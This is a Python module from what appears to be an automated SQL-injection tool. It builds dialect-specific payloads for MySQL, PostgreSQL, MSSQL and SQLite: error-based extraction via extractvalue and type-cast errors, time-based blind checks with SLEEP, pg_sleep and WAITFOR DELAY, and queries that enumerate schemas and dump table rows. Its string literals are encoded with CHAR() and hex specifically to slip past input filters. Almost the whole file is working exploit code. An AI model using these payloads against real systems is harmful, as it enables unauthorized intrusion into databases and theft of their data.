"""DBMS dialects: build the SQL fragments the extractor injects.

Each :class:`Dialect` knows how to express, for one DBMS, the primitives the
extraction engine needs:

* scalar helpers - ``substr`` / ``ascii`` / ``length`` / ``mid`` and quote-free
  string literals (built from ``CHAR()``/``chr()`` so they survive inside an
  already-quoted injection context);
* metadata *sources* - ``(select_expr, from_where)`` pairs for enumerating
  databases, tables, columns and dumping rows;
* channel payloads - dialect-correct UNION column lists, error-based
  extraction payloads (+ how to parse the leaked value), and time-based
  conditional payloads.

String literals are emitted with character functions rather than quotes on
purpose: the payload is spliced into a value that is usually already wrapped in
``'...'``, and nested quotes are exactly what filters look for.
"""

from __future__ import annotations

import re
from typing import List, Optional, Tuple

from .models import DBMS

# Delimiters wrapped around a value in the UNION/error channels so it can be
# located unambiguously in the response even amongst legitimate output.
DELIM_START = "0xSMRTSQL"  # replaced per-dialect via str_literal of the text
MARK = "sQ1"
MARK_L = f"{MARK}L"
MARK_R = f"{MARK}R"

Source = Tuple[str, str]  # (select_expr, from_where)


class Dialect:
    dbms: DBMS
    banner_expr: str = "@@version"
    current_user_expr: Optional[str] = None
    current_db_expr: Optional[str] = None
    supports_error: bool = False
    supports_time: bool = True
    error_chunk: Optional[int] = None  # if the error channel truncates values

    # -- scalar helpers ------------------------------------------------- #
    def str_literal(self, s: str) -> str:
        raise NotImplementedError

    def substr(self, expr: str, pos: int) -> str:
        return f"substr({expr},{pos},1)"

    def mid(self, expr: str, pos: int, length: int) -> str:
        return f"substr({expr},{pos},{length})"

    def ascii(self, expr: str) -> str:
        return f"ascii({expr})"

    def length(self, expr: str) -> str:
        return f"length({expr})"

    def concat(self, parts: List[str]) -> str:
        return "||".join(parts)

    def scalar_nth(self, select_expr: str, from_where: str, offset: int) -> str:
        return f"(SELECT {select_expr} FROM {from_where} LIMIT 1 OFFSET {offset})"

    def scalar_count(self, from_where: str) -> str:
        return f"(SELECT COUNT(*) FROM {from_where})"

    # -- metadata sources ---------------------------------------------- #
    def databases_source(self) -> Source:
        raise NotImplementedError

    def tables_source(self, db: str) -> Source:
        raise NotImplementedError

    def columns_source(self, db: str, table: str) -> Source:
        raise NotImplementedError

    def rows_source(self, db: str, table: str, columns: List[str]) -> Source:
        raise NotImplementedError

    # -- channels ------------------------------------------------------- #
    def marker(self, inner: str) -> str:
        """Wrap ``inner`` scalar with locatable text markers."""
        return self.concat([self.str_literal(MARK_L), inner, self.str_literal(MARK_R)])

    def error_payload(self, prefix: str, suffix: str, inner: str) -> Optional[str]:
        return None

    def error_parse(self, body: str) -> Optional[str]:
        return None

    def time_payload(
        self, prefix: str, suffix: str, cond: str, delay: int
    ) -> Optional[str]:
        return None


# --------------------------------------------------------------------------- #
class MySQLDialect(Dialect):
    dbms = DBMS.MYSQL
    banner_expr = "version()"
    current_user_expr = "current_user()"
    current_db_expr = "database()"
    supports_error = True
    error_chunk = 30  # extractvalue truncates around 32 chars

    def str_literal(self, s: str) -> str:
        return "0x" + s.encode().hex()

    def concat(self, parts: List[str]) -> str:
        return "concat(" + ",".join(parts) + ")"

    def databases_source(self) -> Source:
        return ("schema_name", "information_schema.schemata")

    def tables_source(self, db: str) -> Source:
        return (
            "table_name",
            f"information_schema.tables WHERE table_schema={self.str_literal(db)}",
        )

    def columns_source(self, db: str, table: str) -> Source:
        return (
            "column_name",
            "information_schema.columns WHERE "
            f"table_schema={self.str_literal(db)} AND "
            f"table_name={self.str_literal(table)}",
        )

    def rows_source(self, db: str, table: str, columns: List[str]) -> Source:
        cols = ",0x7c,".join(f"ifnull({c},0x20)" for c in columns)
        return (f"concat({cols})", f"{db}.{table}")

    def error_payload(self, prefix, suffix, inner):
        wrapped = self.concat([self.str_literal("~"), inner, self.str_literal("~")])
        return f"{prefix} AND extractvalue(1,{wrapped}){suffix}"

    def error_parse(self, body: str) -> Optional[str]:
        m = re.search(r"XPATH syntax error: '~?(.*?)~?'", body)
        return m.group(1) if m else None

    def time_payload(self, prefix, suffix, cond, delay):
        return f"{prefix} AND IF(({cond}),SLEEP({delay}),0){suffix}"


# --------------------------------------------------------------------------- #
class PostgreSQLDialect(Dialect):
    dbms = DBMS.POSTGRESQL
    banner_expr = "version()"
    current_user_expr = "current_user"
    current_db_expr = "current_database()"
    supports_error = True

    def str_literal(self, s: str) -> str:
        return "||".join(f"chr({ord(c)})" for c in s) if s else "chr(32)"

    def databases_source(self) -> Source:
        return ("datname", "pg_database")

    def tables_source(self, db: str) -> Source:
        skip = f"({self.str_literal('pg_catalog')},{self.str_literal('information_schema')})"
        return ("table_name", f"information_schema.tables WHERE table_schema NOT IN {skip}")

    def columns_source(self, db: str, table: str) -> Source:
        return (
            "column_name",
            f"information_schema.columns WHERE table_name={self.str_literal(table)}",
        )

    def rows_source(self, db: str, table: str, columns: List[str]) -> Source:
        cols = "||chr(124)||".join(f"COALESCE(CAST({c} AS TEXT),chr(32))" for c in columns)
        return (cols, table)

    def error_payload(self, prefix, suffix, inner):
        return f"{prefix} AND 1=CAST(({inner}) AS INT){suffix}"

    def error_parse(self, body: str) -> Optional[str]:
        m = re.search(r'invalid input syntax for [\w ]+: "([^"]*)"', body)
        return m.group(1) if m else None

    def time_payload(self, prefix, suffix, cond, delay):
        return (
            f"{prefix} AND (CASE WHEN ({cond}) THEN "
            f"(SELECT 1 FROM pg_sleep({delay})) ELSE 1 END)=1{suffix}"
        )


# --------------------------------------------------------------------------- #
class MSSQLDialect(Dialect):
    dbms = DBMS.MSSQL
    banner_expr = "@@version"
    current_user_expr = "SYSTEM_USER"
    current_db_expr = "DB_NAME()"
    supports_error = True

    def str_literal(self, s: str) -> str:
        return "+".join(f"CHAR({ord(c)})" for c in s) if s else "CHAR(32)"

    def substr(self, expr, pos):
        return f"SUBSTRING({expr},{pos},1)"

    def mid(self, expr, pos, length):
        return f"SUBSTRING({expr},{pos},{length})"

    def ascii(self, expr):
        return f"ASCII({expr})"

    def length(self, expr):
        return f"LEN({expr})"

    def concat(self, parts):
        return "+".join(parts)

    def scalar_nth(self, select_expr, from_where, offset):
        return (
            f"(SELECT {select_expr} FROM {from_where} "
            f"ORDER BY 1 OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY)"
        )

    def databases_source(self) -> Source:
        return ("name", "master..sysdatabases")

    def tables_source(self, db: str) -> Source:
        return ("table_name", f"{db}.information_schema.tables")

    def columns_source(self, db: str, table: str) -> Source:
        return (
            "column_name",
            f"{db}.information_schema.columns WHERE table_name={self.str_literal(table)}",
        )

    def rows_source(self, db: str, table: str, columns: List[str]) -> Source:
        cols = "+CHAR(124)+".join(f"CAST({c} AS NVARCHAR(MAX))" for c in columns)
        return (cols, f"{db}.dbo.{table}")

    def error_payload(self, prefix, suffix, inner):
        return f"{prefix} AND 1=CONVERT(INT,({inner})){suffix}"

    def error_parse(self, body: str) -> Optional[str]:
        m = re.search(r"(?:varchar|nvarchar|value) '([^']*)'", body)
        return m.group(1) if m else None

    def time_payload(self, prefix, suffix, cond, delay):
        return f"{prefix}; IF ({cond}) WAITFOR DELAY '0:0:{delay}'{suffix}"


# --------------------------------------------------------------------------- #
class SQLiteDialect(Dialect):
    dbms = DBMS.SQLITE
    banner_expr = "sqlite_version()"
    current_user_expr = None
    current_db_expr = None
    supports_error = False
    supports_time = False

    def str_literal(self, s: str) -> str:
        return "char(" + ",".join(str(ord(c)) for c in s) + ")" if s else "char(32)"

    def ascii(self, expr):
        return f"unicode({expr})"

    def databases_source(self) -> Source:
        return ("name", "pragma_database_list")

    def tables_source(self, db: str) -> Source:
        return (
            "name",
            "sqlite_master WHERE type=" + self.str_literal("table")
            + " AND name NOT LIKE " + self.str_literal("sqlite_%"),
        )

    def columns_source(self, db: str, table: str) -> Source:
        return ("name", f"pragma_table_info({self.str_literal(table)})")

    def rows_source(self, db: str, table: str, columns: List[str]) -> Source:
        cols = "||char(124)||".join(f"ifnull(cast({c} as text),char(32))" for c in columns)
        return (cols, table)


_DIALECTS = {
    DBMS.MYSQL: MySQLDialect(),
    DBMS.POSTGRESQL: PostgreSQLDialect(),
    DBMS.MSSQL: MSSQLDialect(),
    DBMS.SQLITE: SQLiteDialect(),
}


def for_dbms(dbms: DBMS) -> Optional[Dialect]:
    return _DIALECTS.get(dbms)
